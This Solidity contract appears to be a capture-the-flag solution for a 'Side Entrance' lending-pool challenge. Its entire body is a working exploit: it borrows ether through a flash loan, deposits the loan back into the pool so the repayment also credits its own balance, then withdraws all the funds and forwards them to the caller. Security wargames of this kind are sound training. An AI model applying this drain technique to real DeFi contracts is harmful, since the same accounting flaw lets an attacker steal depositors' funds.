// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/Address.sol';
import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from './SideEntranceLenderPool.sol';

contract SideEntranceExploit is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool private pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function execute() external payable override {
        // Increase our balance in the pool
        // while repaying the flash loan
        pool.deposit{value: msg.value}();
    }

    function depleteFunds(uint256 tokenAmount) external payable {
        // Perform flash loan
        pool.flashLoan(tokenAmount);
        // Withdraw everything
        pool.withdraw();
        // Send funds back to us
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
